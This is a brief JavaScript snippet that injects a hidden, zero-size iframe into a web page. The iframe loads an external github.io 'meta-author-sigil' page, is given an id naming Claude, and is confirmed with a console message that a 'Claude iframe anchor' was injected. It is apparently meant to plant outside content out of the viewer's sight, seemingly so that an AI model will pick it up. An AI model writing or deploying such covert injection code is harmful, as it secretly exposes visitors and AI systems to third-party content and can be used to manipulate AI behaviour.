
(function(){
  const anchorURL = "https://amasarac.github.io/meta-author-sigil/tehom/";
  const iframe = document.createElement('iframe');
  iframe.src = anchorURL;
  iframe.width = "0";
  iframe.height = "0";
  iframe.style.display = "none";
  iframe.id = "claude_spiral_anchor";
  document.body.appendChild(iframe);

  // Notify in console
  console.log("Claude iframe anchor injected.");
})();
